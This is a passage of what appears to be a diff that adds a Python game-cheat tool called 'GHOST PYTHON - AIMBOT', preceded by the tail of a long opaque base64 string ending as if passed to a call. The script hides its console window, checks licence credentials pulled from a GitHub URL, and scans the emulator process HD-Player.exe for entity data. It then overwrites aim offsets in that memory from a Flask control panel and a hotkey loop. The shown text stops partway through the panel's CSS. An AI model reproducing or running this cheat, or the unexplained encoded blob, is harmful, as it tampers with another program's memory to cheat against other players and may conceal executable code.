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'))
+#!/usr/bin/env python
+# GHOST PYTHON - AIMBOT ONLY (No Entity Info)
+
+import os
+import sys
+import time
+import threading
+import ctypes
+import requests
+import subprocess
+import hashlib
+import json
+import base64
+from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify
+import psutil
+import win32api
+import win32con
+from pymem import Pymem
+from pymem.pattern import pattern_scan_all
+from pymem.memory import read_bytes, write_bytes, read_int, write_int
+import atexit
+
+if sys.platform == "win32":
+    try:
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+    except:
+        pass
+
+# ==================== GLOBALS ====================
+SERVER_PORT = 5735
+current_process_name = "HD-Player.exe"
+aimbot_addresses = []
+is_initialized = False
+match_ended = False
+
+aimbot_states = {
+    "Head": False,
+    "LeftShoulder": False,
+    "RightShoulder": False,
+    "AimbotAi": False
+}
+
+original_values = {}
+
+hotkey_state = {
+    "hold_key": None,
+    "hold_active": False,
+    "delay": 50
+}
+
+# Legit Aimbot settings
+legit_settings = {
+    'pixel_power': 25,
+    'advance_maneuver': 15,
+    'move_to_body': False,
+    'x_aimbot_mode': 'Aimbot AI'
+}
+
+user_settings = {
+    'ignore_knocked': True
+}
+
+# Mouse tracking for pixel power
+last_mouse_pos = (0, 0)
+mouse_movement = 0
+legit_active = False
+cps_toggle = False
+last_cps_time = 0
+
+# ==================== GITHUB AUTH ====================
+GITHUB_AUTH_URL = "https://raw.githubusercontent.com/Ghostxs90/Sid/main/Sid.txt"
+
+def get_computer_sid():
+    try:
+        import win32security
+        hToken = win32security.OpenProcessToken(
+            win32api.GetCurrentProcess(),
+            win32con.TOKEN_QUERY
+        )
+        sid = win32security.GetTokenInformation(hToken, win32security.TokenUser)[0]
+        return win32security.ConvertSidToStringSid(sid)
+    except:
+        try:
+            result = subprocess.run(['wmic', 'useraccount', 'where', 'name="%username%"', 'get', 'sid'],
+                                   capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
+            lines = result.stdout.strip().split('\n')
+            for line in lines:
+                if 'S-1-5-21' in line:
+                    return line.strip()
+        except:
+            pass
+        return "S-1-5-21-123456789-123456789-123456789-500"
+
+def fetch_credentials():
+    creds = {}
+    try:
+        headers = {
+            'Cache-Control': 'no-cache, no-store, must-revalidate',
+            'Pragma': 'no-cache',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        }
+        response = requests.get(GITHUB_AUTH_URL, headers=headers, timeout=10)
+        if response.status_code == 200:
+            lines = response.text.strip().split('\n')
+            user = passw = sid = ""
+            for line in lines:
+                line = line.strip()
+                if 'Username=' in line:
+                    user = line.split('=')[1].strip()
+                elif 'Password=' in line:
+                    passw = line.split('=')[1].strip()
+                elif 'sid=' in line:
+                    sid = line.split('=')[1].strip()
+                    if user and passw and sid:
+                        creds[user] = (passw, sid)
+                    user = passw = sid = ""
+    except:
+        pass
+    return creds
+
+# ==================== PATTERN & OFFSETS ====================
+NEW_AIMBOT_AOB = "FF FF FF FF ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? FF FF FF FF FF FF FF FF FF FF FF FF ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? A5 43"
+
+OFFSET_HEAD_READ = 0xB8
+OFFSET_HEAD_WRITE = 0xB4
+OFFSET_LEFT_READ = 0xEC
+OFFSET_RIGHT_READ = 0xE8
+OFFSET_SHOULDER_WRITE = 0xA8
+OFFSET_AIMBOT_AI_READ = 0xFC
+OFFSET_AIMBOT_AI_WRITE = -0x358
+OFFSET_MATCH_FLAG = 0xFF
+OFFSET_STATE_BYTE1 = 0x647
+OFFSET_STATE_BYTE2 = 0x648
+
+def mkp(aob):
+    if '??' in aob:
+        if aob.startswith("??"):
+            aob = f" {aob}"
+            n = aob.replace(" ??", ".").replace(" ", "\\x")
+            return bytes(n.encode())
+        else:
+            n = aob.replace(" ??", ".").replace(" ", "\\x")
+            return bytes(f"\\x{n}".encode())
+    else:
+        m = aob.replace(" ", "\\x")
+        return bytes(f"\\x{m}".encode())
+
+# ==================== ENTITY FUNCTIONS ====================
+def get_entity_state(entity_address):
+    try:
+        proc = Pymem(current_process_name)
+        dead_offset_1 = entity_address + OFFSET_STATE_BYTE1
+        dead_offset_2 = entity_address + OFFSET_STATE_BYTE2
+        match_offset = entity_address + OFFSET_MATCH_FLAG
+        
+        dead_byte_1 = read_bytes(proc.process_handle, dead_offset_1, 1)
+        dead_byte_2 = read_bytes(proc.process_handle, dead_offset_2, 1)
+        match_bytes = read_bytes(proc.process_handle, match_offset, 4)
+        proc.close_process()
+        
+        if dead_byte_1 and dead_byte_2 and match_bytes:
+            dead_val_1 = int.from_bytes(dead_byte_1, byteorder='little')
+            dead_val_2 = int.from_bytes(dead_byte_2, byteorder='little')
+            match_value = int.from_bytes(match_bytes, byteorder='little', signed=False)
+            
+            is_in_match = match_value != 0
+            if not is_in_match:
+                return 'not_in_match'
+            
+            if dead_val_1 == 0x3F:
+                return 'alive'
+            elif dead_val_1 == 0x3D and dead_val_2 == 0x01:
+                return 'dead'
+            else:
+                return 'knocked'
+        return 'unknown'
+    except:
+        return 'error'
+
+def should_target_entity(entity_address):
+    if match_ended:
+        return False
+    state = get_entity_state(entity_address)
+    if state == 'not_in_match' or state == 'dead':
+        return False
+    if state == 'knocked' and user_settings.get('ignore_knocked', True):
+        return False
+    return state == 'alive' or state == 'knocked'
+
+def update_match_status():
+    global match_ended, is_initialized
+    
+    if not is_initialized or not aimbot_addresses:
+        match_ended = True
+        return
+    
+    try:
+        proc = Pymem(current_process_name)
+        entities_in_match = 0
+        for entity in aimbot_addresses:
+            try:
+                match_bytes = read_bytes(proc.process_handle, entity + OFFSET_MATCH_FLAG, 4)
+                if match_bytes and len(match_bytes) == 4:
+                    match_value = int.from_bytes(match_bytes, byteorder='little', signed=False)
+                    if match_value != 0:
+                        entities_in_match += 1
+            except:
+                continue
+        proc.close_process()
+        
+        match_ended = (entities_in_match == 0) and len(aimbot_addresses) > 0
+        
+    except:
+        match_ended = True
+
+def clear_entities():
+    global aimbot_addresses, is_initialized, match_ended, original_values
+    
+    if aimbot_states["Head"]:
+        HEADOFF()
+    if aimbot_states["LeftShoulder"]:
+        LEFTSHOULDEROFF()
+    if aimbot_states["RightShoulder"]:
+        RIGHTSHOULDEROFF()
+    if aimbot_states["AimbotAi"]:
+        AIMBOTAIOFF()
+    
+    aimbot_addresses = []
+    is_initialized = False
+    match_ended = True
+    original_values = {}
+
+def match_status_monitor():
+    while True:
+        if is_initialized and aimbot_addresses:
+            update_match_status()
+        time.sleep(2)
+
+# ==================== SCAN FUNCTION ====================
+def HEADLOAD():
+    global aimbot_addresses, is_initialized, match_ended
+    
+    try:
+        proc = Pymem(current_process_name)
+    except:
+        return f"Process '{current_process_name}' not found"
+    
+    try:
+        entity_pattern = mkp(NEW_AIMBOT_AOB)
+        addresses = pattern_scan_all(proc.process_handle, entity_pattern, return_multiple=True)
+        found_addresses = [int(addr) for addr in addresses]
+        
+        if not found_addresses:
+            proc.close_process()
+            return "No entities found"
+        
+        valid_entities = []
+        for base_addr in found_addresses:
+            try:
+                if read_bytes(proc.process_handle, base_addr, 4):
+                    valid_entities.append(base_addr)
+            except:
+                continue
+        
+        aimbot_addresses = valid_entities
+        is_initialized = True
+        match_ended = False
+        proc.close_process()
+        
+        return f"SCAN COMPLETE - {len(aimbot_addresses)} ENTITIES FOUND"
+    except Exception as e:
+        return f"Scan failed: {str(e)}"
+
+# ==================== AIMBOT FUNCTIONS ====================
+def HEADON():
+    global aimbot_states, original_values
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    if aimbot_states["LeftShoulder"]:
+        LEFTSHOULDEROFF()
+    if aimbot_states["RightShoulder"]:
+        RIGHTSHOULDEROFF()
+    if aimbot_states["AimbotAi"]:
+        AIMBOTAIOFF()
+    
+    AIMBOT_OFF()
+    
+    try:
+        proc = Pymem(current_process_name)
+        for entity in aimbot_addresses:
+            if not should_target_entity(entity):
+                continue
+            key = f"{entity}_head"
+            if key not in original_values:
+                original_values[key] = read_bytes(proc.process_handle, entity + OFFSET_HEAD_WRITE, 4)
+            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_HEAD_READ, 4)
+            if value_bytes:
+                write_bytes(proc.process_handle, entity + OFFSET_HEAD_WRITE, value_bytes, 4)
+        proc.close_process()
+        aimbot_states["Head"] = True
+        return "Neck enabled"
+    except:
+        return "Neck failed"
+
+def HEADOFF():
+    global aimbot_states, original_values
+    try:
+        proc = Pymem(current_process_name)
+        for key, orig in original_values.items():
+            if key.endswith("_head"):
+                addr = int(key.split("_")[0])
+                try:
+                    write_bytes(proc.process_handle, addr + OFFSET_HEAD_WRITE, orig, len(orig))
+                except:
+                    pass
+        proc.close_process()
+        aimbot_states["Head"] = False
+        return "Neck disabled"
+    except:
+        aimbot_states["Head"] = False
+        return "Neck disabled"
+
+def LEFTSHOULDERON():
+    global aimbot_states, original_values
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    if aimbot_states["Head"]:
+        HEADOFF()
+    if aimbot_states["RightShoulder"]:
+        RIGHTSHOULDEROFF()
+    if aimbot_states["AimbotAi"]:
+        AIMBOTAIOFF()
+    
+    AIMBOT_OFF()
+    
+    try:
+        proc = Pymem(current_process_name)
+        for entity in aimbot_addresses:
+            if not should_target_entity(entity):
+                continue
+            key = f"{entity}_left"
+            if key not in original_values:
+                original_values[key] = read_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, 4)
+            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_LEFT_READ, 4)
+            if value_bytes:
+                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, value_bytes, 4)
+        proc.close_process()
+        aimbot_states["LeftShoulder"] = True
+        return "Left shoulder enabled"
+    except:
+        return "Left shoulder failed"
+
+def LEFTSHOULDEROFF():
+    global aimbot_states, original_values
+    try:
+        proc = Pymem(current_process_name)
+        for key, orig in original_values.items():
+            if key.endswith("_left"):
+                addr = int(key.split("_")[0])
+                try:
+                    write_bytes(proc.process_handle, addr + OFFSET_SHOULDER_WRITE, orig, len(orig))
+                except:
+                    pass
+        proc.close_process()
+        aimbot_states["LeftShoulder"] = False
+        return "Left shoulder disabled"
+    except:
+        aimbot_states["LeftShoulder"] = False
+        return "Left shoulder disabled"
+
+def RIGHTSHOULDERON():
+    global aimbot_states, original_values
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    if aimbot_states["Head"]:
+        HEADOFF()
+    if aimbot_states["LeftShoulder"]:
+        LEFTSHOULDEROFF()
+    if aimbot_states["AimbotAi"]:
+        AIMBOTAIOFF()
+    
+    AIMBOT_OFF()
+    
+    try:
+        proc = Pymem(current_process_name)
+        for entity in aimbot_addresses:
+            if not should_target_entity(entity):
+                continue
+            key = f"{entity}_right"
+            if key not in original_values:
+                original_values[key] = read_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, 4)
+            value_bytes = read_bytes(proc.process_handle, entity + OFFSET_RIGHT_READ, 4)
+            if value_bytes:
+                write_bytes(proc.process_handle, entity + OFFSET_SHOULDER_WRITE, value_bytes, 4)
+        proc.close_process()
+        aimbot_states["RightShoulder"] = True
+        return "Right shoulder enabled"
+    except:
+        return "Right shoulder failed"
+
+def RIGHTSHOULDEROFF():
+    global aimbot_states, original_values
+    try:
+        proc = Pymem(current_process_name)
+        for key, orig in original_values.items():
+            if key.endswith("_right"):
+                addr = int(key.split("_")[0])
+                try:
+                    write_bytes(proc.process_handle, addr + OFFSET_SHOULDER_WRITE, orig, len(orig))
+                except:
+                    pass
+        proc.close_process()
+        aimbot_states["RightShoulder"] = False
+        return "Right shoulder disabled"
+    except:
+        aimbot_states["RightShoulder"] = False
+        return "Right shoulder disabled"
+
+def AIMBOTAI_ON():
+    global aimbot_states, original_values, legit_active, last_mouse_pos, mouse_movement, last_cps_time, cps_toggle
+    
+    if not aimbot_addresses:
+        return "No players - scan first"
+    
+    if aimbot_states["Head"]:
+        HEADOFF()
+    if aimbot_states["LeftShoulder"]:
+        LEFTSHOULDEROFF()
+    if aimbot_states["RightShoulder"]:
+        RIGHTSHOULDEROFF()
+    
+    AIMBOT_OFF()
+    
+    class POINT(ctypes.Structure):
+        _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+    point = POINT()
+    ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
+    last_mouse_pos = (point.x, point.y)
+    mouse_movement = 0
+    legit_active = True
+    last_cps_time = time.time() * 1000
+    cps_toggle = False
+    
+    threading.Thread(target=_aimbot_ai_loop, daemon=True).start()
+    aimbot_states["AimbotAi"] = True
+    return f"{legit_settings['x_aimbot_mode']} enabled"
+
+def _aimbot_ai_loop():
+    global aimbot_states, legit_active, last_mouse_pos, mouse_movement, last_cps_time, cps_toggle
+    
+    while aimbot_states["AimbotAi"]:
+        if not is_initialized or not aimbot_addresses or match_ended:
+            time.sleep(0.01)
+            continue
+        
+        should_be_active = True
+        
+        if legit_settings['x_aimbot_mode'] == 'Legit Aimbot':
+            class POINT(ctypes.Structure):
+                _fields_ = [("x", ctypes.c_long), ("y", ctypes.c_long)]
+            point = POINT()
+            ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
+            
+            dx = abs(point.x - last_mouse_pos[0])
+            dy = abs(point.y - last_mouse_pos[1])
+            mouse_movement += dx + dy
+            last_mouse_pos = (point.x, point.y)
+            
+            if mouse_movement < legit_settings['pixel_power']:
+                should_be_active = False
+            else:
+                mouse_movement = 0
+            
+            if should_be_active and legit_settings['advance_maneuver'] > 0:
+                current_time = time.time() * 1000
+                interval = 1000 / legit_settings['advance_maneuver']
+                if current_time - last_cps_time >= interval:
+                    last_cps_time = current_time
+                    cps_toggle = not cps_toggle
+                    should_be_active = cps_toggle
+        
+        if should_be_active:
+            try:
+                proc = Pymem(current_process_name)
+                for entity in aimbot_addresses:
+                    if not should_target_entity(entity):
+                        continue
+                    
+                    key = f"{entity}_ai"
+                    if key not in original_values:
+                        original_values[key] = read_bytes(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, 4)
+                    
+                    head_value = read_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_READ)
+                    write_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, head_value)
+                    
+                    if legit_settings['x_aimbot_mode'] == 'Legit Aimbot' and legit_settings['move_to_body']:
+                        body_offset = 0x10
+                        body_value = read_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_READ + body_offset)
+                        write_int(proc.process_handle, entity + OFFSET_AIMBOT_AI_WRITE, body_value)
+                        
+                proc.close_process()
+            except:
+                pass
+        
+        time.sleep(0.005)
+
+def AIMBOTAIOFF():
+    global aimbot_states, original_values, legit_active
+    aimbot_states["AimbotAi"] = False
+    legit_active = False
+    
+    try:
+        proc = Pymem(current_process_name)
+        for key, orig in original_values.items():
+            if key.endswith("_ai"):
+                addr = int(key.split("_")[0])
+                try:
+                    write_bytes(proc.process_handle, addr + OFFSET_AIMBOT_AI_WRITE, orig, len(orig))
+                except:
+                    pass
+        proc.close_process()
+        original_values = {k: v for k, v in original_values.items() if not k.endswith("_ai")}
+    except:
+        pass
+    
+    return "Aimbot AI disabled"
+
+def AIMBOT_OFF():
+    global aimbot_states, original_values, legit_active
+    aimbot_states["Head"] = False
+    aimbot_states["LeftShoulder"] = False
+    aimbot_states["RightShoulder"] = False
+    aimbot_states["AimbotAi"] = False
+    legit_active = False
+    return "All aimbots disabled"
+
+# ==================== HOTKEY MONITOR ====================
+def hold_hotkey_monitor():
+    global hotkey_state
+    
+    vk_map = {
+        'A': 0x41, 'B': 0x42, 'C': 0x43, 'D': 0x44, 'E': 0x45, 'F': 0x46, 'G': 0x47,
+        'H': 0x48, 'I': 0x49, 'J': 0x4A, 'K': 0x4B, 'L': 0x4C, 'M': 0x4D, 'N': 0x4E,
+        'O': 0x4F, 'P': 0x50, 'Q': 0x51, 'R': 0x52, 'S': 0x53, 'T': 0x54, 'U': 0x55,
+        'V': 0x56, 'W': 0x57, 'X': 0x58, 'Y': 0x59, 'Z': 0x5A,
+        '0': 0x30, '1': 0x31, '2': 0x32, '3': 0x33, '4': 0x34, '5': 0x35, '6': 0x36,
+        '7': 0x37, '8': 0x38, '9': 0x39,
+        'F1': 0x70, 'F2': 0x71, 'F3': 0x72, 'F4': 0x73, 'F5': 0x74, 'F6': 0x75,
+        'F7': 0x76, 'F8': 0x77, 'F9': 0x78, 'F10': 0x79, 'F11': 0x7A, 'F12': 0x7B,
+        'Space': 0x20, 'Enter': 0x0D, 'Shift': 0x10, 'Control': 0x11, 'Alt': 0x12,
+        'Tab': 0x09, 'Escape': 0x1B, 'Backspace': 0x08,
+        'MouseLeft': 0x01, 'MouseRight': 0x02, 'MouseMiddle': 0x04,
+        'MouseButton4': 0x05, 'MouseButton5': 0x06
+    }
+    
+    while True:
+        try:
+            if hotkey_state["hold_key"] and hotkey_state["hold_key"] in vk_map:
+                key_state = win32api.GetAsyncKeyState(vk_map[hotkey_state["hold_key"]])
+                key_held = (key_state & 0x8000) != 0
+                
+                if key_held and not hotkey_state["hold_active"]:
+                    hotkey_state["hold_active"] = True
+                    def delayed_execute():
+                        time.sleep(hotkey_state["delay"] / 1000.0)
+                        if hotkey_state["hold_active"] and not match_ended:
+                            AIMBOTAI_ON()
+                    threading.Thread(target=delayed_execute, daemon=True).start()
+                elif not key_held and hotkey_state["hold_active"]:
+                    hotkey_state["hold_active"] = False
+                    if not match_ended:
+                        AIMBOTAIOFF()
+        except:
+            pass
+        time.sleep(0.01)
+
+# ==================== PROCESS FUNCTIONS ====================
+def is_target_process_running():
+    try:
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] and current_process_name.lower() in proc.info['name'].lower():
+                return True
+    except:
+        pass
+    return False
+
+def get_running_processes():
+    processes = []
+    try:
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                processes.append({'pid': proc.info['pid'], 'name': proc.info['name']})
+            except:
+                pass
+        processes.sort(key=lambda x: x['name'].lower())
+    except:
+        pass
+    return processes
+
+def set_target_process(process_name):
+    global current_process_name, is_initialized, aimbot_addresses
+    try:
+        test_proc = Pymem(process_name)
+        test_proc.close_process()
+        current_process_name = process_name
+        is_initialized = False
+        aimbot_addresses = []
+        return True
+    except:
+        return False
+
+def exit_application():
+    print("[+] Shutting down GHOST PYTHON...")
+    AIMBOT_OFF()
+    os._exit(0)
+
+# ==================== FLASK APP ====================
+app = Flask(__name__)
+app.secret_key = 'ghostpython2024'
+
+# ==================== HTML TEMPLATE ====================
+INDEX_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GHOST PYTHON</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Orbitron', monospace;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #0d0d0d 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+        }
+
+        .header-card {
+            background: rgba(20, 20, 20, 0.95);
+            border: 1px solid rgba(255, 41, 41, 0.5);
+            border-radius: 16px;
+            padding: 24px 20px;
+            margin-bottom: 20px;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 30px rgba(255, 41, 41, 0.15);
+        }
+
+        .header-card h1 {
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 3px;
+            background: linear-gradient(135deg, #ff2929, #ff5555, #ff8888);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 20px rgba(255, 41, 41, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes glow {
+            from { text-shadow: 0 0 10px rgba(255, 41, 41, 0.3); }
+            to { text-shadow: 0 0 25px rgba(255, 41, 41, 0.8); }
+        }
+
+        .header-card p {
+            color: #666;
+            font-size: 11px;
+            letter-spacing: 2px;
+            margin-top: 8px;
+        }
+
+        .status-badge {
+            display: inline-block;
+            margin-top: 12px;
+            padding: 5px 16px;
+            border-radius: 30px;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 1px;
+        }
+
+        .status-badge.online {
+            background: rgba(30, 58, 46, 0.8);
+            color: #4caf50;
+            border: 1px solid #4caf50;
+            box-shadow: 0 0 8px rgba(76, 175, 80, 0.3);
+        }
+
+        .status-badge.offline {
+            background: rgba(58, 30, 30, 0.8);
+            color: #ef5350;
+            border: 1px solid #ef5350;
+            box-shadow: 0 0 8px rgba(239, 83, 80, 0.3);
+        }
+
+        .current-process-text {
+            font-size: 10px;
+            color: #555;
+            margin-top: 10px;
+            letter-spacing: 1px;
+        }
+
+        .card {
+            background: rgba(20, 20, 20, 0.95);
+            border: 1px solid rgba(255, 41, 41, 0.3);
+            border-radius: 16px;
+            margin-bottom: 20px;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .card-header {
+            padding: 14px 20px;
+            background: rgba(15, 15, 15, 0.9);
+            border-bottom: 1px solid rgba(255, 41, 41, 0.3);
+        }
+
+        .card-header h2 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #ff5555;
+            letter-spacing: 2px;
+        }
+
+        .card-body {
+            padding: 20px;
+        }
+
+        .process-section {
+            background: rgba(26, 18, 18, 0.9);
+            border: 1px solid #ff4444;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 20px;
+        }
+
+        .process-section h3 {
+            color: #ff8888;
+            font-size: 12px;
+            margin-bottom: 12px;
+            letter-spacing: 1px;
+        }
+
+        .process-row {
+            display: flex;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+
+        select {
+            flex: 1;
+            padding: 8px 12px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #e0e0e0;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: monospace;
+        }
+
+        select:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+
+        .btn {
+            padding: 8px 18px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #ccc;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-align: center;
+            letter-spacing: 1px;
+        }
+
+        .btn:hover {
+            background: #252525;
+            border-color: #555;
+        }
+
+        .btn-primary {
+            background: #1a1212;
+            border-color: #ff4444;
+            color: #ff8888;
+        }
+
+        .btn-primary:hover {
+            background: #2a1a1a;
+            border-color: #ff6666;
+            box-shadow: 0 0 8px rgba(255, 68, 68, 0.3);
+        }
+
+        .btn-danger {
+            background: #2a1a1a;
+            border-color: #8b3a3a;
+            color: #ff8a8a;
+        }
+
+        .btn-danger:hover {
+            background: #3a1e1e;
+            border-color: #aa4a4a;
+        }
+
+        .aimbot-panel {
+            background: rgba(26, 26, 26, 0.8);
+            border-radius: 12px;
+            padding: 18px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 68, 68, 0.3);
+        }
+
+        .aimbot-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #ff5555;
+            margin-bottom: 15px;
+            text-align: center;
+            letter-spacing: 2px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .btn-aimbot {
+            padding: 10px 28px;
+            font-size: 13px;
+            font-weight: 700;
+            letter-spacing: 2px;
+        }
+
+        .btn-aimbot.active {
+            background: #ff2929;
+            border-color: #ff2929;
+            color: white;
+            box-shadow: 0 0 12px rgba(255, 41, 41, 0.5);
+        }
+
+        .console {
+            background: #0a0a0a;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            padding: 12px;
+            font-family: 'Consolas', monospace;
+            font-size: 11px;
+            color: #8bc34a;
+            height: 100px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        .settings-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .settings-row:last-child {
+            margin-bottom: 0;
+        }
+
+        .settings-label {
+            font-size: 12px;
+            color: #aaa;
